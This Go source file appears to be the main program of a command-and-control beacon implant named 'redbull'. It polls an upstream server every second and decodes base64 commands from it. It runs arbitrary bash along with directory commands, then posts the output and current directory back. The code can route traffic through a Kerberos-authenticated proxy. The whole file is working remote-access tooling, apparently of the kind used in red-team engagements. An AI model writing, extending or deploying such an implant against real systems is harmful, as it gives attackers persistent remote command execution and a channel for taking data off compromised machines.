package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	config "redbull"
	"strings"
	"syscall"
	"time"

	"redbull/internal/rbhttp"
	"redbull/internal/rbkrb"
)

var SLEEP_TIME = 1 * time.Second
var CWD = ""

var COMMAND_MAP = map[string]func(cmd string) (string, string, error){
	"shell":  runBashWithTimeout,
	"pwd":    getCwd,
	"cd":     changeDirectory,
	"ls":     listDirectory,
	"status": getBeaconStatus,
}

func init() {
	cwd, err := os.Getwd()

	if err != nil {
		panic(err)
	}

	CWD = cwd
}

func getCwd(_ string) (string, string, error) {
	return CWD, "", nil
}

func getBeaconStatus(_ string) (string, string, error) {
	return fmt.Sprintf("Upstream: %s\nProxy: %s\nUsing KRB: %t\nSleep Time: %s", config.UPSTREAM, config.PROXY_URL, config.USE_KRB, SLEEP_TIME), "", nil
}

func changeDirectory(command string) (string, string, error) {
	// Join the current directory with the command path
	newCwd := filepath.Join(CWD, command)

	// Resolve to absolute path (handles relative paths like ../..)
	absPath, err := filepath.Abs(newCwd)
	if err != nil {
		return "", "", fmt.Errorf("failed to resolve path '%s': %w", newCwd, err)
	}

	res, err := os.Stat(absPath)
	if os.IsNotExist(err) {
		return "", "", fmt.Errorf("invalid path '%s': path does not exist", absPath)
	}

	if !res.IsDir() {
		return "", "", fmt.Errorf("invalid path '%s': not a directory", absPath)
	}

	CWD = absPath
	return fmt.Sprintf("changed directory to %s", CWD), "", nil
}

func listDirectory(path string) (string, string, error) {
	if path == "" {
		path = CWD
	}
	files, err := os.ReadDir(path)
	if err != nil {
		return "", "", fmt.Errorf("failed to read directory %s: %w", CWD, err)
	}

	fileNames := make([]string, 0)
	for _, f := range files {
		fileNames = append(fileNames, f.Name())
	}

	return strings.Join(fileNames, "\n"), "", nil
}

func runBashWithTimeout(command string) (string, string, error) {
	timeout := 100 * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "bash", "-c", command)

	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf

	err := cmd.Run()
	if ctx.Err() == context.DeadlineExceeded {
		return outBuf.String(), errBuf.String(), fmt.Errorf("connection timed out after %v", timeout)
	}

	return outBuf.String(), errBuf.String(), err
}

func parseAndExecuteCommand(command string) (string, string, error) {
	commandGroups := strings.Split(command, " ")
	if len(commandGroups) == 0 {
		return "", "", fmt.Errorf("no command groups found for command %s", command)
	}

	commandName := commandGroups[0]
	commandArgs := strings.Join(commandGroups[1:], " ")

	if fn, ok := COMMAND_MAP[commandName]; ok {
		return fn(commandArgs)
	} else {
		return "", "", fmt.Errorf("no command '%s' found", command)
	}
}

func main() {
	termSig := make(chan os.Signal, 1)
	signal.Notify(termSig, syscall.SIGINT, syscall.SIGTERM)

	var httpClient rbhttp.HttpClient
	if config.USE_KRB {
		httpClient = rbkrb.NewKrbCurlHttpClient(config.PROXY_URL)
	} else {
		httpClient = rbhttp.NewSimpleHttpClient()
	}

	for {
		select {
		case <-termSig:
			return
		default:
			time.Sleep(SLEEP_TIME)

			resp, err := rbhttp.Get[rbhttp.CheckInResponse](httpClient, config.UPSTREAM)
			if err != nil {
				continue
			}

			decoded, err := base64.StdEncoding.DecodeString(resp.Command)
			if err != nil {
				sendResult(httpClient, "", "", err.Error())
				continue
			}

			command := string(decoded)
			stdout, stderr, err := parseAndExecuteCommand(command)

			if err != nil {
				stderr = fmt.Sprintf("%s\nerror: %s", stderr, err.Error())
			}

			sendResult(httpClient, command, stdout, stderr)
		}
	}
}

func sendResult(httpClient rbhttp.HttpClient, command, stdout, stderr string) {
	result := rbhttp.HttpBody{
		Command:          command,
		Stdout:           stdout,
		Stderr:           stderr,
		CurrentDirectory: CWD,
	}

	_, err := rbhttp.Post[any](httpClient, config.UPSTREAM, result)
	if err != nil {
		_ = err
	}
}
